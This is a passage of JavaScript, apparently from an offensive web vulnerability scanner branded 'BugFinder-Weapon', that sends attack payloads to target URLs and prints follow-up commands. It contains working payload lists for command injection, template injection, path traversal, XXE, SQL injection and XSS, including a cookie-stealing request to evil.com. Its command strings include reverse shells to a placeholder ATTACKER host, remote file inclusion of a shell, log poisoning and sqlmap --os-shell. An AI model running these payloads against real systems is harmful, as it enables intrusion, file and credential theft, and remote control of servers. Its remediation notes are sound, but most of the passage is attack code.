};

export function checkKnownCVEs(techStack) {
    const vulns = [];
    for (const tech of techStack) {
        const techName = tech.tech_name || tech.name || '';
        for (const [key, cves] of Object.entries(KNOWN_CVE_DB)) {
            if (techName.toLowerCase().includes(key.toLowerCase())) {
                for (const cve of cves) {
                    vulns.push({
                        cve_id: cve.cve,
                        technology: techName,
                        version: tech.tech_version || tech.version || '',
                        cvss_score: cve.cvss,
                        severity: cve.severity,
                        description: cve.desc,
                        poc_available: 1,
                        poc_url: `https://nvd.nist.gov/vuln/detail/${cve.cve}`,
                        exploitation_guide: cve.poc || `1. Verify ${techName} version is affected\n2. Check NVD: https://nvd.nist.gov/vuln/detail/${cve.cve}\n3. Search exploit-db for public exploits\n4. Test in controlled environment`,
                        vuln_type: 'Known CVE'
                    });
                }
            }
        }
    }
    return vulns;
}

// ═══════════════════════════════════════
// Exploit Analysis
// ═══════════════════════════════════════

export function checkExploits(vulns) {
    const results = [];
    for (const v of vulns) {
        const isKnownCVE = v.cve_id?.startsWith('CVE-');
        let exploitable = 0, confidence = 30, riskScore = 20;
        let payload = 'N/A (Passive Analysis)', evidence = `Vulnerability ${v.cve_id} detected.`;

        if (isKnownCVE) {
            exploitable = 1; confidence = 85; riskScore = v.cvss_score ? Math.round(v.cvss_score * 10) : 70;
            evidence = `Known CVE with public exploits. CVSS: ${v.cvss_score}`;
            payload = `See NVD/ExploitDB for ${v.cve_id}`;
        } else if (v.vuln_type === 'SQL Injection' || v.vuln_type === 'Cross-Site Scripting (XSS)') {
            exploitable = 1; confidence = 90; riskScore = 85;
            payload = v.payload || 'Active test confirmed'; evidence = `Active testing confirmed: ${v.vuln_type}`;
        } else if (v.vuln_type === 'Subdomain Takeover' || v.vuln_type === 'Path Traversal') {
            exploitable = 1; confidence = 80; riskScore = 90;
            evidence = `${v.vuln_type} confirmed through active testing.`;
        } else if (v.vuln_type === 'Sensitive File Exposure' && v.severity === 'critical') {
            exploitable = 1; confidence = 95; riskScore = 80;
            payload = `curl ${v.affected_url}`; evidence = 'Sensitive file directly accessible via HTTP GET.';
        } else if (v.severity === 'critical' || v.severity === 'high') {
            exploitable = 1; confidence = 60; riskScore = 60;
            evidence = `${v.severity} severity vulnerability detected.`;
        }

        results.push({
            cve_id: v.cve_id, affected_url: v.affected_url || '', exploitable, confidence,
            payload_used: payload, evidence, risk_score: riskScore,
            verification_methods: isKnownCVE ? 'CVE Database Match' : 'Active Testing'
        });
    }
    return results;
}

// ═══════════════════════════════════════
// One-Tap Exploit Verification — Multi-Method + RCE
// ═══════════════════════════════════════

async function tryMultiPayloads(targetUrl, payloads, paramNames, checkFn, opts = {}) {
    const results = [];
    for (const payload of payloads) {
        for (const param of paramNames) {
            const sep = targetUrl.includes('?') ? '&' : '?';
            const testUrl = `${targetUrl}${sep}${param}=${encodeURIComponent(payload)}`;
            try {
                const res = await axios({
                    method: opts.method || 'GET',
                    url: testUrl,
                    timeout: opts.timeout || 8000,
                    validateStatus: () => true,
                    maxRedirects: opts.maxRedirects ?? 3,
                    headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) BugFinder-Weapon/3.0', ...(opts.headers || {}) },
                    data: opts.body || undefined,
                });
                const body = typeof res.data === 'string' ? res.data : JSON.stringify(res.data || '');
                const match = checkFn(body, res, payload, param);
                if (match) {
                    results.push({ hit: true, payload, param, testUrl, status: res.status, body, evidence: match, headers: res.headers });
                    if (!opts.findAll) return results;
                }
            } catch (e) {
                if (opts.checkError && e.response) {
                    const body = typeof e.response.data === 'string' ? e.response.data : '';
                    const match = checkFn(body, e.response, payload, param);
                    if (match) results.push({ hit: true, payload, param, testUrl, status: e.response.status, body, evidence: match, headers: e.response.headers });
                }
            }
        }
    }
    return results;
}

export async function verifyExploit(vuln, url) {
    const result = { verified: false, evidence: '', response_code: 0, response_body: '', payload: '', remediation: '', commands: '', exploit_type: '', methods_tried: 0, methods_succeeded: 0 };

    try {
        const targetUrl = vuln.affected_url || url;
        result.exploit_type = vuln.vuln_type || 'Unknown';

        // ═══════════════════════════════════════
        // SENSITIVE FILE EXPOSURE (Multi-method)
        // ═══════════════════════════════════════
        if (vuln.cve_id?.startsWith('SENSITIVE-') || vuln.vuln_type === 'Sensitive File Exposure') {
            const methods = ['GET', 'HEAD', 'POST'];
            const encodings = [targetUrl, targetUrl.replace(/\./g, '%2e'), targetUrl + '%00', targetUrl + '?'];
            result.methods_tried = methods.length * encodings.length;
            for (const method of methods) {
                for (const testUrl of encodings) {
                    try {
                        const res = await axios({ method, url: testUrl, timeout: 15000, validateStatus: () => true, headers: { 'User-Agent': 'Mozilla/5.0 BugFinder/3.0' } });
                        result.response_code = res.status;
                        if (res.status === 200) {
                            const data = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);
                            result.verified = true; result.methods_succeeded++;
                            result.payload = `${method} ${testUrl}`;
                            result.response_body = data;
                            result.evidence = `Sensitive file accessible via ${method}! Status: ${res.status}. Size: ${data.length} bytes.`;
                        }
                    } catch (e) {}
                }
                if (result.verified) break;
            }
            result.remediation = 'Block access:\n  Apache: <FilesMatch "^\\.">\n    Require all denied\n  </FilesMatch>\n  Nginx: location ~ /\\. { deny all; return 403; }';
            result.commands = `# Multi-method file exposure test:\ncurl -sI ${targetUrl}\ncurl -s ${targetUrl} | head -30\ncurl -X POST ${targetUrl}\ncurl -s "${targetUrl}%00"\n\n# WAF bypass attempts:\ncurl -H "X-Forwarded-For: 127.0.0.1" ${targetUrl}\ncurl -H "X-Original-URL: ${new URL(targetUrl).pathname}" ${url}`;
            return result;
        }

        // ═══════════════════════════════════════
        // COMMAND INJECTION / RCE (NEW)
        // ═══════════════════════════════════════
        if (vuln.vuln_type === 'Command Injection' || vuln.vuln_type === 'Remote Code Execution') {
            const rcePayloads = [
                ';id', '|id', '`id`', '$(id)', ';whoami', '|whoami',
                '||id', '&&id', '\nid', ';cat /etc/passwd',
                '|cat /etc/passwd', '$(cat /etc/passwd)',
                ';echo BUGFINDER_RCE_CONFIRMED', '|echo BUGFINDER_RCE_CONFIRMED',
                '`echo BUGFINDER_RCE_CONFIRMED`', '$(echo BUGFINDER_RCE_CONFIRMED)',
                ';ping -c 1 127.0.0.1', '|ping -c 1 127.0.0.1',
                '%0aid', '%0awhoami',
            ];
            const rceParams = ['cmd', 'exec', 'command', 'run', 'ping', 'host', 'ip', 'query', 'file', 'path', 'dir', 'input', 'data', 'url', 'domain', 'target', 'address', 'name', 'q', 'search'];
            const rceIndicators = ['uid=', 'gid=', 'root:', 'www-data', 'daemon:', 'nobody:', '/bin/', 'BUGFINDER_RCE_CONFIRMED', 'bytes from 127.0.0.1', '1 packets transmitted'];

            result.methods_tried = rcePayloads.length * rceParams.length;
            const hits = await tryMultiPayloads(targetUrl, rcePayloads, rceParams, (body, res, payload) => {
                const lower = body.toLowerCase();
                const found = rceIndicators.find(ind => lower.includes(ind.toLowerCase()));
                if (found) return `RCE indicator "${found}" found in response with payload "${payload}"`;
                return null;
            });

            if (hits.length > 0) {
                const best = hits[0];
                result.verified = true; result.methods_succeeded = hits.length;
                result.payload = best.payload;
                result.response_code = best.status;
                result.evidence = `REMOTE CODE EXECUTION CONFIRMED! ${best.evidence}. Parameter: ${best.param}`;
                result.response_body = best.body;
            } else {
                result.evidence = `Tested ${rcePayloads.length} RCE payloads across ${rceParams.length} parameters. No command execution detected.`;
            }

            // Also try POST-based RCE
            if (!result.verified) {
                for (const payload of rcePayloads.slice(0, 6)) {
                    for (const param of rceParams.slice(0, 8)) {
                        try {
                            const res = await axios.post(targetUrl, `${param}=${encodeURIComponent(payload)}`, {
                                timeout: 15000, validateStatus: () => true,
                                headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0 BugFinder/3.0' }
                            });
                            const body = typeof res.data === 'string' ? res.data : '';
                            const found = rceIndicators.find(ind => body.toLowerCase().includes(ind.toLowerCase()));
                            if (found) {
                                result.verified = true; result.methods_succeeded++;
                                result.payload = `POST ${param}=${payload}`;
                                result.response_code = res.status;
                                result.evidence = `RCE via POST! Indicator "${found}" in response. Parameter: ${param}`;
                                result.response_body = body;
                                break;
                            }
                        } catch (e) {}
                    }
                    if (result.verified) break;
                }
            }

            result.remediation = 'CRITICAL: Never pass user input to system commands.\n  - Use subprocess with argument arrays (no shell=True)\n  - Whitelist allowed characters\n  - Use language-native libraries instead of system calls\n  - Implement strict input validation';
            result.commands = `# RCE Testing:\ncurl -s "${targetUrl}?cmd=id"\ncurl -s "${targetUrl}?exec=whoami"\ncurl -s "${targetUrl}?host=;id"\ncurl -X POST "${targetUrl}" -d "cmd=id"\n\n# Reverse shell (if RCE confirmed):\n# bash -i >& /dev/tcp/ATTACKER/4444 0>&1\n# python3 -c 'import socket,subprocess;s=socket.socket();s.connect(("ATTACKER",4444));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'\n\n# Fix: Remove all exec/system/popen calls with user input`;
            return result;
        }

        // ═══════════════════════════════════════
        // SERVER-SIDE TEMPLATE INJECTION (SSTI) — RCE vector
        // ═══════════════════════════════════════
        if (vuln.vuln_type === 'Template Injection' || vuln.vuln_type === 'SSTI') {
            const sstiPayloads = [
                '{{7*7}}', '${7*7}', '<%= 7*7 %>', '#{7*7}', '{7*7}',
                '{{config}}', '{{self.__class__}}',
                "{{''.__class__.__mro__[1].__subclasses__()}}",
                '${T(java.lang.Runtime).getRuntime().exec("id")}',
                '{{request.application.__globals__.__builtins__.__import__("os").popen("id").read()}}',
                '{{lipsum.__globals__.os.popen("id").read()}}',
                '{{cycler.__init__.__globals__.os.popen("id").read()}}',
            ];
            const sstiParams = ['name', 'template', 'input', 'q', 'search', 'text', 'content', 'message', 'title', 'page', 'email'];
            result.methods_tried = sstiPayloads.length * sstiParams.length;

            const hits = await tryMultiPayloads(targetUrl, sstiPayloads, sstiParams, (body, res, payload) => {
                if (payload === '{{7*7}}' && body.includes('49')) return 'SSTI confirmed: {{7*7}} evaluated to 49';
                if (payload === '${7*7}' && body.includes('49')) return 'SSTI confirmed: ${7*7} evaluated to 49';
                if (payload === '<%= 7*7 %>' && body.includes('49')) return 'SSTI confirmed: ERB template eval to 49';
                if (body.includes('uid=') || body.includes('root:') || body.includes('www-data')) return `RCE via SSTI! Command output detected with payload "${payload}"`;
                if (body.includes("__class__") && body.includes("__subclasses__")) return 'SSTI confirmed: Python class hierarchy exposed';
                if (body.includes('SECRET_KEY') || body.includes('config')) return 'SSTI confirmed: Server config leaked';
                return null;
            });

            if (hits.length > 0) {
                const best = hits[0];
                result.verified = true; result.methods_succeeded = hits.length;
                result.payload = best.payload;
                result.response_code = best.status;
                result.evidence = `SERVER-SIDE TEMPLATE INJECTION! ${best.evidence}`;
                result.response_body = best.body;
            }

            result.remediation = 'Never render user input inside templates.\n  - Use sandboxed template engines\n  - Escape all user input before template rendering\n  - Use logic-less templates (Mustache)';
            result.commands = `# SSTI Testing:\ncurl -s "${targetUrl}?name={{7*7}}" | grep 49\ncurl -s "${targetUrl}?q=\$\\{7*7\\}" | grep 49\ncurl -s "${targetUrl}?input={{config}}"\n\n# Escalate to RCE (Jinja2):\ncurl -s "${targetUrl}?name={{lipsum.__globals__.os.popen('id').read()}}"\n\n# Fix: Use template auto-escaping, never insert raw user input`;
            return result;
        }

        // ═══════════════════════════════════════
        // PATH TRAVERSAL + LFI/RFI → RCE
        // ═══════════════════════════════════════
        if (vuln.vuln_type === 'Path Traversal' || vuln.vuln_type === 'Local File Inclusion') {
            const lfiPayloads = [
                '../../../etc/passwd', '....//....//....//etc/passwd', '..%252f..%252f..%252fetc/passwd',
                '../../../../etc/passwd', '../../../../../etc/passwd', '../../../../../../etc/passwd',
                '../../../../../../../etc/passwd', '../../../../../../../../etc/passwd',
                '..\\..\\..\\windows\\win.ini', '..%5c..%5c..%5cwindows%5cwin.ini',
                '../../../etc/shadow', '../../../proc/self/environ', '../../../proc/self/cmdline',
                '/etc/passwd', 'C:\\windows\\win.ini',
                'php://filter/convert.base64-encode/resource=/etc/passwd',
                'php://input', 'data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==',
                'expect://id', 'file:///etc/passwd',
                '../../../var/log/apache2/access.log', '../../../var/log/nginx/access.log',
            ];
            const lfiParams = ['file', 'path', 'page', 'include', 'load', 'read', 'doc', 'folder', 'dir', 'template', 'view', 'content', 'src', 'img', 'filename'];
            const lfiIndicators = ['root:', 'daemon:', 'nobody:', '/bin/bash', '/bin/sh', '[fonts]', '[extensions]', 'HTTP_', 'DOCUMENT_ROOT', 'SERVER_SOFTWARE', 'PD9waH'];

            // Method 1: Direct path traversal appended to URL (like CVE-2021-41773)
            const directPaths = [
                '/..%2f..%2f..%2f..%2fetc/passwd',
                '/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
                '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
                '/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
                '/cgi-bin/..%2f..%2f..%2f..%2fetc/passwd',
                '/..%252f..%252f..%252f..%252fetc/passwd',
                '/..\\..\\..\\..\\etc/passwd',
                '/....//....//....//....//etc/passwd',
                '/../../../etc/passwd',
                '/..%00/..%00/..%00/etc/passwd',
            ];
            const baseUrl = targetUrl.replace(/\/+$/, '');
            let directHit = null;
            for (const dpath of directPaths) {
                try {
                    const res = await axios({ method: 'GET', url: baseUrl + dpath, timeout: 15000, validateStatus: () => true, headers: { 'User-Agent': 'Mozilla/5.0 BugFinder/3.0' } });
                    const body = typeof res.data === 'string' ? res.data : JSON.stringify(res.data || '');
                    const found = lfiIndicators.find(ind => body.includes(ind));
                    if (found) {
                        directHit = { body, status: res.status, payload: dpath, evidence: `Direct path traversal! Indicator "${found}" found via ${dpath}` };
                        break;
                    }
                } catch (e) {}
            }
            result.methods_tried = directPaths.length + (lfiPayloads.length * lfiParams.length);

            // Method 2: Query param injection
            const hits = await tryMultiPayloads(targetUrl, lfiPayloads, lfiParams, (body, res, payload) => {
                const found = lfiIndicators.find(ind => body.includes(ind));
                if (found) return `LFI confirmed! Indicator "${found}" found. File content leaked via "${payload}"`;
                return null;
            });

            // Prefer direct path hit (cleaner output) over query param hit
            const best = directHit || (hits.length > 0 ? hits[0] : null);
            if (best) {
                result.verified = true; result.methods_succeeded = (directHit ? 1 : 0) + hits.length;
                result.payload = best.payload;
                result.response_code = best.status;
                result.evidence = `PATH TRAVERSAL / LFI EXPLOITED! ${best.evidence}`;
                // Extract the actual file content from within HTML responses
                const rawBody = best.body;
                let extractedContent = rawBody;
                // Check if response looks like raw file content (no HTML tags)
                const isRawFile = !rawBody.includes('<!DOCTYPE') && !rawBody.includes('<html') && !rawBody.includes('<HTML');
                if (isRawFile) {
                    // Direct file content — show as-is
                    extractedContent = rawBody;
                } else {
                    // HTML-wrapped — try to extract file contents
                    const passwdMatch = rawBody.match(/(root:[x*]:0:0:.*(?:\n(?:[a-z_][a-z0-9_-]*:[^:]*:[^:]*:[^:]*:[^:]*:[^:]*:[^\n]*))*)/im);
                    const winIniMatch = rawBody.match(/(\[fonts\][\s\S]*?\[extensions\][\s\S]*)/im);
                    const envMatch = rawBody.match(/(DOCUMENT_ROOT=.*(?:\n.*=.*)*)/im);
                    if (passwdMatch) {
                        extractedContent = '=== EXTRACTED FILE CONTENT (/etc/passwd) ===\n\n' + passwdMatch[0] + '\n\n=== FULL RAW RESPONSE BELOW ===\n\n' + rawBody;
                    } else if (winIniMatch) {
                        extractedContent = '=== EXTRACTED FILE CONTENT (win.ini) ===\n\n' + winIniMatch[0] + '\n\n=== FULL RAW RESPONSE BELOW ===\n\n' + rawBody;
                    } else if (envMatch) {
                        extractedContent = '=== EXTRACTED FILE CONTENT (proc/environ) ===\n\n' + envMatch[0] + '\n\n=== FULL RAW RESPONSE BELOW ===\n\n' + rawBody;
                    }
                }
                result.response_body = extractedContent;
            }

            result.remediation = 'Sanitize file paths:\n  - Remove ../ sequences\n  - Use realpath() and verify within allowed directory\n  - Never use user input directly in file operations\n  - Disable PHP wrappers (allow_url_include=Off)';
            result.commands = `# LFI Testing:\ncurl -s "${targetUrl}?file=../../../etc/passwd"\ncurl -s "${targetUrl}?page=....//....//....//etc/passwd"\ncurl -s "${targetUrl}?file=php://filter/convert.base64-encode/resource=index.php"\n\n# RFI to RCE:\ncurl -s "${targetUrl}?file=http://ATTACKER/shell.php"\n\n# LFI to RCE via log poisoning:\ncurl -H "User-Agent: <?php system('id'); ?>" ${targetUrl}\ncurl -s "${targetUrl}?file=../../../var/log/apache2/access.log"`;
            return result;
        }

        // ═══════════════════════════════════════
        // XXE INJECTION → File Read / RCE
        // ═══════════════════════════════════════
        if (vuln.vuln_type === 'XXE Injection') {
            const xxePayloads = [
                `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><data>&xxe;</data></root>`,
                `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root>&xxe;</root>`,
                `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:80">]><root>&xxe;</root>`,
            ];
            result.methods_tried = xxePayloads.length;
            for (const payload of xxePayloads) {
                try {
                    const res = await axios.post(targetUrl, payload, {
                        timeout: 15000, validateStatus: () => true,
                        headers: { 'Content-Type': 'application/xml', 'User-Agent': 'Mozilla/5.0 BugFinder/3.0' }
                    });
                    const body = typeof res.data === 'string' ? res.data : '';
                    if (body.includes('root:') || body.includes('daemon:') || body.includes('nobody:')) {
                        result.verified = true; result.methods_succeeded++;
                        result.payload = payload.substring(0, 200);
                        result.evidence = `XXE CONFIRMED! Server file content leaked in response. OS file read achieved!`;
                        result.response_body = body.substring(0, 2000);
                        result.response_code = res.status;
                        break;
                    }
                } catch (e) {}
            }
            result.remediation = 'Disable XML external entities:\n  PHP: libxml_disable_entity_loader(true);\n  Java: factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);\n  Python: defusedxml library';
            result.commands = `# XXE Testing:\ncurl -X POST "${targetUrl}" -H "Content-Type: application/xml" \\\n  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'\n\n# Blind XXE (out-of-band):\n# Host DTD on attacker server, exfiltrate data via HTTP`;
            return result;
        }

        // ═══════════════════════════════════════
        // CROSS-SITE SCRIPTING (Multi-method)
        // ═══════════════════════════════════════
        if (vuln.vuln_type === 'Cross-Site Scripting (XSS)') {
            const xssPayloads = [
                '<script>alert(1)</script>', '<img src=x onerror=alert(1)>', '"><svg onload=alert(1)>',
                "'-alert(1)-'", '<details open ontoggle=alert(1)>', '<body onload=alert(1)>',
                'javascript:alert(1)', '<iframe src="javascript:alert(1)">', '<marquee onstart=alert(1)>',
                '"><img src=x onerror=alert(document.domain)>', '<script>fetch("http://evil.com?c="+document.cookie)</script>',
                '${alert(1)}', '{{constructor.constructor("alert(1)")()}}',
            ];
            const xssParams = ['q', 'search', 'query', 'name', 'input', 'text', 'message', 'content', 'title', 'user', 'value', 'id', 'page', 'redirect', 'url', 'callback', 'ref', 'error'];
            result.methods_tried = xssPayloads.length * xssParams.length;

            const hits = await tryMultiPayloads(targetUrl, xssPayloads, xssParams, (body, res, payload) => {
                if (body.includes(payload)) return `XSS payload "${payload}" reflected WITHOUT encoding!`;
                // Check partial reflection (WAF bypass)
                const stripped = payload.replace(/[<>"']/g, '');
                if (stripped.length > 5 && body.includes(stripped)) return `Partial XSS reflection detected. Payload partially reflected.`;
                return null;
            });

            if (hits.length > 0) {
                const best = hits[0];
                result.verified = true; result.methods_succeeded = hits.length;
                result.payload = best.payload;
                result.response_code = best.status;
                result.evidence = `XSS CONFIRMED! ${best.evidence} via parameter "${best.param}"`;
                result.response_body = best.body.substring(Math.max(0, best.body.indexOf(best.payload) - 200), Math.min(best.body.length, best.body.indexOf(best.payload) + best.payload.length + 200));
            } else {
                result.evidence = `Tested ${xssPayloads.length} XSS payloads across ${xssParams.length} parameters. All properly encoded/filtered.`;
            }
            result.remediation = 'Sanitize and HTML-encode all user input:\n  - Use DOMPurify client-side\n  - Use sanitize-html server-side\n  - Implement strict CSP: script-src \'self\'';
            result.commands = `# XSS Testing (multiple vectors):\ncurl -s "${targetUrl}?q=<script>alert(1)</script>" | grep -i "script"\ncurl -s "${targetUrl}?search=<img+src=x+onerror=alert(1)>" | grep -i "onerror"\ncurl -s "${targetUrl}?name='><svg+onload=alert(1)>"\n\n# DOM XSS check:\ncurl -s "${targetUrl}" | grep -i "document.write\\|innerHTML\\|eval(\\|location.hash"`;
            return result;
        }

        // ═══════════════════════════════════════
        // SQL INJECTION (Multi-method)
        // ═══════════════════════════════════════
        if (vuln.vuln_type === 'SQL Injection') {
            const sqliPayloads = [
                "' OR '1'='1' --", "1 UNION SELECT NULL,NULL--", "'; WAITFOR DELAY '0:0:3'--",
                "1' ORDER BY 10--", "1' AND 1=1--", "1' AND 1=2--",
                "admin'--", "1; SELECT pg_sleep(3)--", "1' OR 1=1#",
                "1 AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
                "' UNION SELECT username,password FROM users--",
                "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
            ];
            const sqliParams = ['id', 'user', 'name', 'search', 'q', 'page', 'category', 'sort', 'order', 'filter', 'item', 'product', 'type'];
            const errorSigs = ['sql syntax', 'mysql', 'sqlstate', 'postgresql', 'ora-', 'unclosed quotation', 'sqlite', 'odbc', 'microsoft sql', 'pg_query', 'mysql_fetch', 'pg::syntaxerror', 'warning: mysql', 'syntax error at or near', 'invalid column name', 'table or view does not exist'];

            result.methods_tried = sqliPayloads.length * sqliParams.length;
            const hits = await tryMultiPayloads(targetUrl, sqliPayloads, sqliParams, (body, res, payload, param) => {
                const lower = body.toLowerCase();
                const found = errorSigs.find(e => lower.includes(e));
                if (found) return `SQL error "${found}" leaked with payload "${payload}" in parameter "${param}"`;
                return null;
            });

            // Time-based blind SQLi test
            if (hits.length === 0) {
                for (const param of sqliParams.slice(0, 5)) {
                    try {
                        const start = Date.now();
                        const sep = targetUrl.includes('?') ? '&' : '?';
                        await axios.get(`${targetUrl}${sep}${param}=${encodeURIComponent("1' AND SLEEP(3)--")}`, { timeout: 15000, validateStatus: () => true });
                        const elapsed = Date.now() - start;
                        if (elapsed >= 2800) {
                            hits.push({ hit: true, payload: "1' AND SLEEP(3)--", param, status: 200, body: '', evidence: `Time-based blind SQLi! Response delayed ${elapsed}ms (expected 3000ms)` });
                            break;
                        }
                    } catch (e) {}
                }
            }

            if (hits.length > 0) {
                const best = hits[0];
                result.verified = true; result.methods_succeeded = hits.length;
                result.payload = best.payload;
                result.response_code = best.status;
                result.evidence = `SQL INJECTION CONFIRMED! ${best.evidence}`;
                result.response_body = best.body;
            } else {
                result.evidence = `Tested ${sqliPayloads.length} SQLi payloads across ${sqliParams.length} params. No SQL errors or timing anomalies.`;
            }
            result.remediation = 'Use parameterized queries:\n  Node.js: db.prepare("SELECT * FROM users WHERE id = ?").get(id)\n  PHP: $stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");\n  Python: cursor.execute("SELECT * FROM users WHERE id = %s", (id,))';
            result.commands = `# SQLi Testing:\ncurl -s "${targetUrl}?id=1'+OR+1=1--" | head -50\ncurl -s "${targetUrl}?id=1'+UNION+SELECT+NULL,NULL--"\n\n# sqlmap automated testing:\nsqlmap -u "${targetUrl}?id=1" --batch --level=5 --risk=3 --dbs\nsqlmap -u "${targetUrl}?id=1" --batch --os-shell\n\n# Time-based blind:\ncurl -s "${targetUrl}?id=1'+AND+SLEEP(5)--" -w "\\nTime: %{time_total}s"`;
            return result;
        }

        // ═══════════════════════════════════════
        // CORS Misconfiguration (Multi-method)
        // ═══════════════════════════════════════
        if (vuln.vuln_type === 'CORS Misconfiguration') {
            const origins = ['https://evil.com', 'https://attacker.com', 'null', `https://${new URL(targetUrl).hostname}.evil.com`];
            result.methods_tried = origins.length;
            for (const origin of origins) {
                try {
                    const res = await axios.get(targetUrl, { timeout: 15000, validateStatus: () => true, headers: { 'Origin': origin } });
                    const acao = res.headers['access-control-allow-origin'];
                    const acac = res.headers['access-control-allow-credentials'];
                    if (acao === '*' || acao === origin) {
                        result.verified = true; result.methods_succeeded++;
                        result.payload = `Origin: ${origin}`;
                        result.response_code = res.status;
                        result.evidence = `CORS misconfiguration! Origin "${origin}" ${acao === '*' ? 'accepted via wildcard' : 'reflected back'}. ${acac === 'true' ? 'CRITICAL: Credentials allowed!' : ''}`;
                        result.response_body = `Access-Control-Allow-Origin: ${acao}\nAccess-Control-Allow-Credentials: ${acac || 'not set'}\nAccess-Control-Allow-Methods: ${res.headers['access-control-allow-methods'] || 'not set'}`;
                        break;
                    }
                } catch (e) {}
            }
            result.remediation = 'Strict origin whitelist validation.\nNever reflect Origin header blindly.\nAvoid ACAO: * with credentials.';
            result.commands = `# CORS Testing:\ncurl -sI -H "Origin: https://evil.com" ${targetUrl} | grep -i "access-control"\ncurl -sI -H "Origin: null" ${targetUrl} | grep -i "access-control"\n\n# Fix: Validate against explicit origin whitelist`;
            return result;
        }

        // ═══════════════════════════════════════
        // MISSING SECURITY HEADERS
        // ═══════════════════════════════════════
        if (vuln.vuln_type === 'Missing Security Header' || vuln.vuln_type === 'Information Disclosure') {
            const res = await axios.head(targetUrl, { timeout: 15000, validateStatus: () => true });
            result.response_code = res.status;
            result.payload = `HEAD ${targetUrl}`;
            result.verified = true; result.methods_tried = 1; result.methods_succeeded = 1;
            const secHeaders = ['strict-transport-security', 'content-security-policy', 'x-frame-options', 'x-content-type-options', 'referrer-policy', 'permissions-policy'];
            const missing = secHeaders.filter(h => !res.headers[h]);
            const present = secHeaders.filter(h => res.headers[h]);
            result.evidence = `${missing.length} security headers missing: ${missing.join(', ')}. ${present.length} present.`;
            result.response_body = Object.entries(res.headers).map(([k, v]) => `${k}: ${v}`).join('\n');
            result.remediation = `Add missing headers:\n${missing.map(h => `  - ${h}`).join('\n')}`;
            result.commands = `# Check headers:\ncurl -sI ${targetUrl}\n\n# Apache:\nHeader always set X-Frame-Options "DENY"\nHeader always set X-Content-Type-Options "nosniff"\nHeader always set Strict-Transport-Security "max-age=31536000"\nHeader always set Content-Security-Policy "default-src 'self'"\n\n# Nginx:\nadd_header X-Frame-Options "DENY" always;\nadd_header X-Content-Type-Options "nosniff" always;`;
            return result;
        }

        // ═══════════════════════════════════════
        // COOKIE SECURITY
        // ═══════════════════════════════════════
        if (vuln.vuln_type === 'Cookie Security') {
            const res = await axios.get(targetUrl, { timeout: 15000, validateStatus: () => true });
            result.response_code = res.status; result.methods_tried = 1;
            result.payload = `GET ${targetUrl} — analyze Set-Cookie headers`;
            const setCookie = res.headers['set-cookie'];
            if (setCookie) {
                result.verified = true; result.methods_succeeded = 1;
                const cookies = Array.isArray(setCookie) ? setCookie : [setCookie];
                const issues = [];
                cookies.forEach(c => {
                    const cl = c.toLowerCase();
                    if (!cl.includes('httponly')) issues.push(`${c.split('=')[0]}: Missing HttpOnly`);
                    if (!cl.includes('secure')) issues.push(`${c.split('=')[0]}: Missing Secure`);
                    if (!cl.includes('samesite')) issues.push(`${c.split('=')[0]}: Missing SameSite`);
                });
                result.evidence = `Cookie security issues:\n${issues.join('\n')}`;
                result.response_body = cookies.join('\n');
            }
            result.remediation = 'Set-Cookie: session=xyz; HttpOnly; Secure; SameSite=Strict; Path=/';
            result.commands = `# Check cookies:\ncurl -sI ${targetUrl} | grep -i set-cookie\n\n# Test cookie theft via XSS (HttpOnly blocks this):\n# document.cookie`;
            return result;
        }

        // ═══════════════════════════════════════
        // OPEN REDIRECT (Multi-method)
        // ═══════════════════════════════════════
        if (vuln.vuln_type === 'Open Redirect') {
            const redirectPayloads = ['https://evil.com', '//evil.com', '/\\evil.com', 'https:evil.com', '///evil.com', '////evil.com/%2f..', 'https://evil.com%00.legitimate.com'];
            const redirectParams = ['url', 'redirect', 'next', 'return', 'returnTo', 'goto', 'continue', 'dest', 'destination', 'redir', 'redirect_uri', 'callback'];
            result.methods_tried = redirectPayloads.length * redirectParams.length;

            for (const payload of redirectPayloads) {
                for (const param of redirectParams) {
                    const sep = targetUrl.includes('?') ? '&' : '?';
                    const testUrl = `${targetUrl}${sep}${param}=${encodeURIComponent(payload)}`;
                    try {
                        const res = await axios.get(testUrl, { timeout: 15000, validateStatus: () => true, maxRedirects: 0 });
                        const location = res.headers['location'] || '';
                        if ([301, 302, 303, 307, 308].includes(res.status) && (location.includes('evil.com') || location.startsWith('//'))) {
                            result.verified = true; result.methods_succeeded++;
                            result.payload = `?${param}=${payload}`;
                            result.evidence = `Open redirect via "${param}"! Redirects to: ${location}`;
                            result.response_code = res.status;
                            break;
                        }
                    } catch (e) {
                        if (e.response?.headers?.['location']?.includes('evil.com')) {
                            result.verified = true; result.methods_succeeded++;
                            result.payload = `?${param}=${payload}`;
                            result.evidence = `Open redirect via "${param}"!`;
                            result.response_code = e.response.status;
                            break;
                        }
                    }
                }
                if (result.verified) break;
            }
            result.remediation = 'Validate redirect URLs against whitelist. Only allow relative paths.';
            result.commands = `# Open redirect testing:\ncurl -sI "${targetUrl}?redirect=https://evil.com" | grep Location\ncurl -sI "${targetUrl}?next=//evil.com" | grep Location\ncurl -sI "${targetUrl}?url=/\\\\evil.com" | grep Location`;
            return result;
        }

        // ═══════════════════════════════════════
        // DESERIALIZATION (RCE vector)
        // ═══════════════════════════════════════
        if (vuln.vuln_type === 'Deserialization') {
            const testPayloads = [
                { ct: 'application/x-java-serialized-object', body: Buffer.from('aced0005', 'hex').toString(), name: 'Java serialized object' },
